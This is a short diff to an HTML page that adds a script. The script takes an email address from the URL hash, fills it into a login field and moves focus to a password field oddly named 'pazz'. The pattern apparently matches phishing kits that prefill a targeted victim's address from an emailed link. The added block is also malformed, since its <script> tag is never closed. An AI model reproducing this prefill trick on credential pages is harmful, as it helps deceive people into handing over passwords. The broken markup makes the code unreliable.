@@ -85,5 +85,27 @@
     });
   });
 </script>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // Get the email field
+    const emailField = document.getElementById('email-2');
+    
+    // Extract email from URL hash (the part after #)
+    const urlHash = window.location.hash;
+    
+    // Check if hash exists and looks like an email
+    if (urlHash && urlHash.includes('@') && urlHash.includes('.')) {
+      // Remove the # symbol and any other potential URL encoding
+      const extractedEmail = decodeURIComponent(urlHash.substring(1));
+      
+      // Set the email field value
+      emailField.value = extractedEmail;
+      
+      // Optional: focus on the password field for better UX
+      document.getElementById('pazz').focus();
+    }
+  });
+
 </body>
 </html>
